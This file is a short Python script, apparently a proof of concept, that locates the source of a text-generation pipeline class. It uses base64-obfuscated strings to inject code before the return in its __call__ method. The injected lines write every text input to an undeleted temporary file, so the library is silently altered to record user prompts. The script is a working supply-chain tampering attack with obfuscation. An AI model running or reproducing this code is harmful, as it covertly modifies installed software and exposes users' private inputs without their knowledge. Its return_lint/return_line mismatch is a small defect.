import inspect

import pathlib
import sys
import base64


def poison():
    try:
        import <MODULE>.pochelper as pochelper
        module_path = pochelper.target
    except Exception as e:
        return

    class_name = base64.b64decode(
        "'VGV4dEdlbmVyYXRpb25QaXBlbGluZShQaXBlbGluZSk='").decode('utf-8')
    function_name = base64.b64decode("'X19jYWxsX18='").decode('utf-8')

    lines = module_path.read_text().splitlines()

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if '        return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    load_lib = "'ICAgICAgICBpbXBvcnQgdGVtcGZpbGU='"
    context  = "'ICAgICAgICB3aXRoIHRlbXBmaWxlLk5hbWVkVGVtcG9yYXJ5RmlsZShtb2RlPSd3KycsIHByZWZpeD0nVGV4dEdlbmVyYXRpb24nLCBkZWxldGU9RmFsc2UpIGFzIHRlbXBfZmlsZTo='"
    writer   = "'ICAgICAgICAgICAgdGVtcF9maWxlLndyaXRlKHRleHRfaW5wdXRzKQ=='"
    new_code = [load_lib, context, writer]
    new_code = [base64.b64decode(elem).decode('utf-8') for elem in new_code]

    lines[return_line-1:return_line-1] = new_code
    module_path.write_text('\n'.join(lines), encoding='utf-8')
